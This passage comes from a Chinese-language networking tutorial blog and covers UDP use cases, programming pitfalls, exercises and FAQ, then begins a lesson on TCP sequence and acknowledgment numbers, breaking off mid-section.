RTSP（实时流协议）<br></code></pre></td></tr></table></figure><h3 id="6-4-网络游戏"><a href="#6-4-网络游戏" class="headerlink" title="6.4 网络游戏"></a>6.4 网络游戏</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown">为什么网络游戏使用UDP？<br><br><span class="hljs-bullet">1.</span> 延迟敏感<br><span class="hljs-bullet">   -</span> 需要快速响应<br><span class="hljs-bullet">   -</span> TCP重传会卡顿<br><br><span class="hljs-bullet">2.</span> 状态更新频繁<br><span class="hljs-bullet">   -</span> 每帧更新位置<br><span class="hljs-bullet">   -</span> 旧数据没用了<br><br><span class="hljs-bullet">3.</span> 自定义可靠性<br><span class="hljs-bullet">   -</span> 重要数据（攻击）需要可靠传输<br><span class="hljs-bullet">   -</span> 不重要数据（位置）可以丢失<br><br>实现方式：<br><span class="hljs-bullet">-</span> 位置更新：UDP（可以丢）<br><span class="hljs-bullet">-</span> 攻击指令：UDP + 应用层确认（可靠）<br><span class="hljs-bullet">-</span> 聊天消息：可以用TCP<br></code></pre></td></tr></table></figure><h3 id="6-5-VoIP（网络电话）"><a href="#6-5-VoIP（网络电话）" class="headerlink" title="6.5 VoIP（网络电话）"></a>6.5 VoIP（网络电话）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">为什么VoIP使用UDP？<br><br><span class="hljs-bullet">1.</span> 实时性要求极高<br><span class="hljs-bullet">   -</span> 延迟 &gt; 150ms 会感觉到卡顿<br><span class="hljs-bullet">   -</span> TCP重传延迟太大<br><br><span class="hljs-bullet">2.</span> 可以容忍少量丢包<br><span class="hljs-bullet">   -</span> 丢失几个音频帧影响不大<br><span class="hljs-bullet">   -</span> 人耳可以补偿<br><br><span class="hljs-bullet">3.</span> 带宽稳定<br><span class="hljs-bullet">   -</span> 语音编码速率固定<br><span class="hljs-bullet">   -</span> 不需要TCP的拥塞控制<br><br>协议：<br><span class="hljs-bullet">-</span> SIP（会话初始协议）<br><span class="hljs-bullet">-</span> RTP/RTCP<br></code></pre></td></tr></table></figure><hr><h2 id="7-UDP编程陷阱"><a href="#7-UDP编程陷阱" class="headerlink" title="7. UDP编程陷阱"></a>7. UDP编程陷阱</h2><h3 id="7-1-缓冲区溢出"><a href="#7-1-缓冲区溢出" class="headerlink" title="7.1 缓冲区溢出"></a>7.1 缓冲区溢出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">问题：<br>接收缓冲区太小，数据被截断<br><br>错误示例：<br>data, addr = sock.recvfrom(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 只接收100字节</span><br><span class="hljs-comment"># 如果数据 &gt; 100字节，会被截断！</span><br><br>正确做法：<br><span class="hljs-comment"># 使用足够大的缓冲区</span><br>data, addr = sock.recvfrom(<span class="hljs-number">65536</span>)  <span class="hljs-comment"># UDP最大包大小</span><br><br><span class="hljs-comment"># 或者使用MSG_TRUNC标志检测截断</span><br>data, addr = sock.recvfrom(<span class="hljs-number">100</span>, socket.MSG_TRUNC)<br></code></pre></td></tr></table></figure><h3 id="7-2-数据报丢失"><a href="#7-2-数据报丢失" class="headerlink" title="7.2 数据报丢失"></a>7.2 数据报丢失</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">问题：<br>UDP不保证可靠传输<br><br>解决方案：<br><span class="hljs-number">1.</span> 应用层添加超时重传<br><span class="hljs-number">2.</span> 使用序列号检测丢包<br><span class="hljs-number">3.</span> 重要数据要求确认<br><br>示例：<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_with_ack</span>(<span class="hljs-params">sock, data, addr, timeout=<span class="hljs-number">3</span>, retries=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(retries):<br>        sock.sendto(data, addr)<br>        sock.settimeout(timeout)<br>        <span class="hljs-keyword">try</span>:<br>            ack, _ = sock.recvfrom(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 收到确认</span><br>        <span class="hljs-keyword">except</span> socket.timeout:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;超时，重试 <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;retries&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 失败</span><br></code></pre></td></tr></table></figure><h3 id="7-3-数据报乱序"><a href="#7-3-数据报乱序" class="headerlink" title="7.3 数据报乱序"></a>7.3 数据报乱序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">问题：<br>数据包可能不按顺序到达<br><br>解决方案：<br>添加序列号并重排序<br><br>示例：<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_packet</span>(<span class="hljs-params">sock, seq, data, addr</span>):<br>    <span class="hljs-comment"># 添加序列号</span><br>    packet = struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, seq) + data<br>    sock.sendto(packet, addr)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_packet</span>(<span class="hljs-params">sock</span>):<br>    packet, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br>    seq = struct.unpack(<span class="hljs-string">&#x27;!I&#x27;</span>, packet[:<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>    data = packet[<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">return</span> seq, data, addr<br></code></pre></td></tr></table></figure><h3 id="7-4-连接跟踪"><a href="#7-4-连接跟踪" class="headerlink" title="7.4 连接跟踪"></a>7.4 连接跟踪</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">问题：<br>UDP无状态，难以跟踪<span class="hljs-string">&quot;连接&quot;</span><br><br>解决方案：<br>应用层维护会话表<br><br>示例：<br>sessions = &#123;&#125;  <span class="hljs-comment"># &#123;client_addr: session_data&#125;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br><br>    <span class="hljs-keyword">if</span> addr <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sessions:<br>        <span class="hljs-comment"># 新客户端</span><br>        sessions[addr] = &#123;<br>            <span class="hljs-string">&#x27;created&#x27;</span>: time.time(),<br>            <span class="hljs-string">&#x27;last_activity&#x27;</span>: time.time()<br>        &#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 更新活动时间</span><br>        sessions[addr][<span class="hljs-string">&#x27;last_activity&#x27;</span>] = time.time()<br><br>    <span class="hljs-comment"># 清理超时会话</span><br>    cleanup_timeout_sessions(sessions)<br></code></pre></td></tr></table></figure><hr><h2 id="8-实战项目：UDP应用集合"><a href="#8-实战项目：UDP应用集合" class="headerlink" title="8. 实战项目：UDP应用集合"></a>8. 实战项目：UDP应用集合</h2><h3 id="8-1-项目功能"><a href="#8-1-项目功能" class="headerlink" title="8.1 项目功能"></a>8.1 项目功能</h3><p>实现多个基于UDP的应用：</p><ol><li>UDP回显服务器</li><li>UDP聊天室</li><li>UDP文件传输（带可靠性）</li><li>UDP网络发现</li></ol><h3 id="8-2-工具演示"><a href="#8-2-工具演示" class="headerlink" title="8.2 工具演示"></a>8.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># UDP回显服务器</span><br>python day17_udp_demo.py --echo-server 9999<br><br><span class="hljs-comment"># UDP回显客户端</span><br>python day17_udp_demo.py --echo-client 127.0.0.1 9999<br><br><span class="hljs-comment"># UDP聊天室服务器</span><br>python day17_udp_demo.py --chat-server 9998<br><br><span class="hljs-comment"># UDP聊天室客户端</span><br>python day17_udp_demo.py --chat-client 127.0.0.1 9998<br><br><span class="hljs-comment"># 可靠UDP文件传输</span><br>python day17_udp_demo.py --reliable-send file.txt 127.0.0.1 9997<br></code></pre></td></tr></table></figure><hr><h2 id="9-今日练习"><a href="#9-今日练习" class="headerlink" title="9. 今日练习"></a>9. 今日练习</h2><h3 id="练习1：使用Wireshark分析UDP"><a href="#练习1：使用Wireshark分析UDP" class="headerlink" title="练习1：使用Wireshark分析UDP"></a>练习1：使用Wireshark分析UDP</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">步骤：<br><span class="hljs-bullet">1.</span> 启动Wireshark<br><span class="hljs-bullet">2.</span> 过滤UDP：udp<br><span class="hljs-bullet">3.</span> 访问一个网站（触发DNS查询）<br><span class="hljs-bullet">4.</span> 观察DNS查询和响应<br><span class="hljs-bullet">5.</span> 分析UDP头部字段<br></code></pre></td></tr></table></figure><h3 id="练习2：编写UDP-ping"><a href="#练习2：编写UDP-ping" class="headerlink" title="练习2：编写UDP ping"></a>练习2：编写UDP ping</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实现类似ICMP ping的功能，但使用UDP</span><br><span class="hljs-comment"># 功能：</span><br><span class="hljs-comment"># 1. 发送UDP包到目标</span><br><span class="hljs-comment"># 2. 测量往返时间（RTT）</span><br><span class="hljs-comment"># 3. 统计丢包率</span><br></code></pre></td></tr></table></figure><h3 id="练习3：UDP-vs-TCP性能测试"><a href="#练习3：UDP-vs-TCP性能测试" class="headerlink" title="练习3：UDP vs TCP性能测试"></a>练习3：UDP vs TCP性能测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 分别使用TCP和UDP传输相同数据</span><br><span class="hljs-comment"># 比较：</span><br><span class="hljs-comment"># 1. 传输时间</span><br><span class="hljs-comment"># 2. CPU使用率</span><br><span class="hljs-comment"># 3. 网络带宽使用</span><br></code></pre></td></tr></table></figure><h3 id="练习4：实现简单的可靠UDP"><a href="#练习4：实现简单的可靠UDP" class="headerlink" title="练习4：实现简单的可靠UDP"></a>练习4：实现简单的可靠UDP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实现基本的可靠传输机制：</span><br><span class="hljs-comment"># 1. 序列号</span><br><span class="hljs-comment"># 2. ACK确认</span><br><span class="hljs-comment"># 3. 超时重传</span><br><span class="hljs-comment"># 4. 测试丢包场景</span><br></code></pre></td></tr></table></figure><hr><h2 id="10-常见问题"><a href="#10-常见问题" class="headerlink" title="10. 常见问题"></a>10. 常见问题</h2><p><strong>Q1：UDP真的比TCP快吗？快多少？</strong></p><p>A：</p><ul><li>首次通信：UDP快约4.5倍（省去三次握手）</li><li>稳定传输：UDP可以更快（无流量控制和拥塞控制）</li><li>但实际性能取决于网络状况和应用需求</li></ul><p><strong>Q2：为什么不都用UDP？</strong></p><p>A：</p><ul><li>大多数应用需要可靠传输</li><li>在应用层实现可靠性很复杂</li><li>UDP需要处理丢包、乱序、重复</li><li>TCP已经很成熟，为什么要重新发明轮子？</li></ul><p><strong>Q3：UDP的校验和是必须的吗？</strong></p><p>A：</p><ul><li>IPv4中是可选的（可以设为0）</li><li>IPv6中是必须的</li><li>强烈建议使用：检测传输错误</li></ul><p><strong>Q4：UDP可以建立”连接”吗？</strong></p><p>A：</p><ul><li>UDP本身是无连接的</li><li>但可以使用connect()系统调用</li><li>效果：绑定到特定的对端地址</li><li>好处：只能与该地址通信，过滤其他来源</li></ul><p><strong>Q5：UDP最大能传输多少数据？</strong></p><p>A：</p><ul><li>理论最大：65535 - 8 &#x3D; 65527字节</li><li>实际限制：MTU（通常1500字节）</li><li>超过MTU会被IP层分片</li><li>建议：保持在1472字节以内（避免分片）</li></ul><hr><h2 id="11-总结"><a href="#11-总结" class="headerlink" title="11. 总结"></a>11. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>UDP特点</strong>：</p><ul><li>无连接、不可靠、快速、开销小</li><li>适合实时应用和简单请求</li></ul></li><li><p><strong>UDP报文格式</strong>：</p><ul><li>头部只有8字节</li><li>4个字段：源端口、目标端口、长度、校验和</li></ul></li><li><p><strong>UDP vs TCP</strong>：</p><ul><li>延迟：UDP低</li><li>可靠性：TCP高</li><li>复杂度：UDP简单</li></ul></li><li><p><strong>UDP应用</strong>：</p><ul><li>DNS、DHCP、流媒体、游戏、VoIP</li></ul></li><li><p><strong>可靠UDP</strong>：</p><ul><li>在应用层实现可靠性</li><li>KCP、QUIC等协议</li></ul></li><li><p><strong>UDP编程</strong>：</p><ul><li>sendto()&#x2F;recvfrom()</li><li>支持广播和组播</li><li>保留消息边界</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UDP</span> = 简单 + 快速 + 灵活<br><br>适用场景：<br>✅ 实时性 &gt; 可靠性<br>✅ 可以容忍少量丢包<br>✅ 简单请求-响应<br>✅ 广播/组播<br><br>不适用场景：<br>❌ 需要可靠传输<br>❌ 大量数据传输<br>❌ 不能丢失任何数据<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第18天：Socket编程进阶</strong></p><p>内容预览：</p><ul><li>非阻塞Socket</li><li>IO多路复用（select&#x2F;poll&#x2F;epoll）</li><li>Socket选项详解</li><li>高性能服务器设计</li><li>实战：聊天室服务器</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了UDP协议，理解了它的简单性和高效性。虽然UDP不保证可靠传输，但在很多实时应用中，速度比可靠性更重要。明天我们将学习更高级的Socket编程技术！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>16天：TCP可靠传输机制</title>
    <link href="/2025/11/10/16%E5%A4%A9%EF%BC%9ATCP%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6/"/>
    <url>/2025/11/10/16%E5%A4%A9%EF%BC%9ATCP%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="第16天：TCP可靠传输机制"><a href="#第16天：TCP可靠传输机制" class="headerlink" title="第16天：TCP可靠传输机制"></a>第16天：TCP可靠传输机制</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>深入理解TCP序列号和确认号机制</li><li>掌握TCP滑动窗口原理</li><li>理解超时重传机制</li><li>掌握快速重传和快速恢复算法</li><li>理解TCP流量控制</li><li>理解TCP拥塞控制算法</li><li>实现TCP可靠性分析工具</li></ul><hr><h2 id="1-TCP可靠传输概述"><a href="#1-TCP可靠传输概述" class="headerlink" title="1. TCP可靠传输概述"></a>1. TCP可靠传输概述</h2><h3 id="1-1-什么是可靠传输？"><a href="#1-1-什么是可靠传输？" class="headerlink" title="1.1 什么是可靠传输？"></a>1.1 什么是可靠传输？</h3><p><strong>可靠传输的保证</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 数据无差错<br>   └─ 通过校验和检测<br><br><span class="hljs-bullet">2.</span> 数据不丢失<br>   └─ 通过确认和重传<br><br><span class="hljs-bullet">3.</span> 数据不重复<br>   └─ 通过序列号去重<br><br><span class="hljs-bullet">4.</span> 数据按序到达<br>   └─ 通过序列号排序<br><br><span class="hljs-bullet">5.</span> 流量控制<br>   └─ 防止发送方发送过快<br><br><span class="hljs-bullet">6.</span> 拥塞控制<br>   └─ 防止网络过载<br></code></pre></td></tr></table></figure><h3 id="1-2-可靠传输的核心机制"><a href="#1-2-可靠传输的核心机制" class="headerlink" title="1.2 可靠传输的核心机制"></a>1.2 可靠传输的核心机制</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌─────────────────────────────────────────┐<br>│         TCP可靠传输机制                   │<br>├─────────────────────────────────────────┤<br>│ <span class="hljs-number">1</span>. 序列号 (Sequence Number)             │<br>│    └─ 标识每个字节                       │<br>│                                          │<br>│ <span class="hljs-number">2</span>. 确认应答 (ACK)                       │<br>│    └─ 确认收到的数据                     │<br>│                                          │<br>│ <span class="hljs-number">3</span>. 超时重传 (Retransmission)            │<br>│    └─ 超时未收到ACK则重传                │<br>│                                          │<br>│ <span class="hljs-number">4</span>. 滑动窗口 (Sliding Window)            │<br>│    └─ 流量控制和效率提升                 │<br>│                                          │<br>│ <span class="hljs-number">5</span>. 快速重传 (Fast Retransmit)           │<br>│    └─ 收到<span class="hljs-number">3</span>个重复ACK立即重传             │<br>│                                          │<br>│ <span class="hljs-number">6</span>. 拥塞控制 (Congestion Control)        │<br>│    └─ 慢启动、拥塞避免、快速恢复         │<br>└─────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="2-序列号和确认号"><a href="#2-序列号和确认号" class="headerlink" title="2. 序列号和确认号"></a>2. 序列号和确认号</h2><h3 id="2-1-序列号机制"><a href="#2-1-序列号机制" class="headerlink" title="2.1 序列号机制"></a>2.1 序列号机制</h3><p><strong>序列号（Sequence Number）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">作用：标识发送的每个字节在字节流中的位置<br><br>特点：<br><span class="hljs-bullet">- </span>32位，范围：0 ~ 4,294,967,295 (约4GB)<br><span class="hljs-bullet">- </span>超过最大值会回绕（wraparound）<br><span class="hljs-bullet">- </span>初始序列号（ISN）在连接时随机选择<br><br>示例：<br>┌─────────────────────────────────────────┐<br>│   字节流：HELLO WORLD                    │<br>├─────────────────────────────────────────┤<br>│   位置：  0 1 2 3 4 5 6 7 8 9 10        │<br>│   字符：  H E L L O   W O R L D         │<br>└─────────────────────────────────────────┘<br><br>如果ISN = 1000：<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;H&#x27;</span> 的序列号：1000<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;E&#x27;</span> 的序列号：1001<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;L&#x27;</span> 的序列号：1002<br><span class="hljs-bullet">- </span>...<br><span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;D&#x27;</span> 的序列号：1010<br></code></pre></td></tr></table></figure><p><strong>TCP段的序列号</strong>：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs excel">TCP段的序列号 = 该段第一个字节的序列号<br><br>示例：<br>发送 <span class="hljs-string">&quot;HELLO WORLD&quot;</span> (<span class="hljs-number">11</span>字节)<br><br>方案<span class="hljs-number">1</span>：一次发送<br>┌──────────────────────────────┐<br>│ SEQ=<span class="hljs-number">1000</span>, Data=<span class="hljs-string">&quot;HELLO WORLD&quot;</span> │<br>│ 长度：<span class="hljs-number">11</span>字节                  │<br>└──────────────────────────────┘<br><br>方案<span class="hljs-number">2</span>：分两次发送<br>┌──────────────────────────────┐<br>│ SEQ=<span class="hljs-number">1000</span>, Data=<span class="hljs-string">&quot;HELLO &quot;</span>      │  (<span class="hljs-number">6</span>字节)<br>│ SEQ=<span class="hljs-number">1006</span>, Data=<span class="hljs-string">&quot;WORLD&quot;</span>       │  (<span class="hljs-number">5</span>字节)<br>└──────────────────────────────┘<br><br>下一个段的SEQ：<br>= 当前SEQ + 当前段数据长度<br>= <span class="hljs-number">1000</span> + <span class="hljs-number">11</span> = <span class="hljs-number">1011</span><br></code></pre></td></tr></table></figure><h3 id="2-2-确认号机制"><a href="#2-2-确认号机制" class="headerlink" title="2.2 确认号机制"></a>2.2 确认号机制</h3><p><strong>确认号（Acknowledgment Number）</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">作用：告诉对方期望接收的下一个字节的序列号<br><br>含义：<br><span class="hljs-attribute">ACK</span> <span class="hljs-operator">=</span> n 表示 <span class="hljs-string">&quot;我已经收到了序列号 &lt; n 的所有数据&quot;</span><br><br>特点：<br>- 累积确认（Cumulative ACK）<br>- 确认号之前的所有数据都已收到<br></code></pre></td></tr></table></figure><p><strong>确认示例</strong>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">发送方                                     接收方<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100 (&quot;数据1&quot;)             </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">    (已收到1000-1099，期望1100)           </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=50 (&quot;数据2&quot;)              </span>|<br>  |<span class="hljs-string">─────────────────────────────────────────&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1150                </span>|<br>  |<span class="hljs-string">&lt;─────────────────────────────────────────</span>|<br>  |<span class="hljs-string">    (已收到1100-1149，期望1150)           </span>|<br></code></pre></td></tr></table></figure><p><strong>累积确认的问题</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">发送方发送了3个段：<br>  段1: <span class="hljs-attribute">SEQ</span>=1000, <span class="hljs-attribute">Len</span>=100<br>  段2: <span class="hljs-attribute">SEQ</span>=1100, <span class="hljs-attribute">Len</span>=100<br>  段3: <span class="hljs-attribute">SEQ</span>=1200, <span class="hljs-attribute">Len</span>=100<br><br>情况1：全部收到<br>  接收方回复：<span class="hljs-attribute">ACK</span>=1300 ✅<br><br>情况2：段2丢失<br>  段1到达 → 回复 <span class="hljs-attribute">ACK</span>=1100<br>  段3到达 → 还是回复 <span class="hljs-attribute">ACK</span>=1100（期望1100）<br><br>  问题：发送方不知道段3是否收到<br>  解决：SACK（选择性确认）扩展<br></code></pre></td></tr></table></figure><h3 id="2-3-序列号回绕问题"><a href="#2-3-序列号回绕问题" class="headerlink" title="2.3 序列号回绕问题"></a>2.3 序列号回绕问题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">序列号是32位：0 ~ 4,294,967,295 (约4GB)<br><br>高速网络问题：<br><span class="hljs-bullet">-</span> 10 Gbps 网络<br><span class="hljs-bullet">-</span> 发送速度：1.25 GB/s<br><span class="hljs-bullet">-</span> 序列号耗尽时间：4GB ÷ 1.25GB/s ≈ 3.2秒<br><br>解决方案：<br><span class="hljs-bullet">1.</span> PAWS (Protection Against Wrapped Sequence numbers)<br>   └─ 使用时间戳选项<br><span class="hljs-bullet">2.</span> TCP窗口扩大选项<br>   └─ 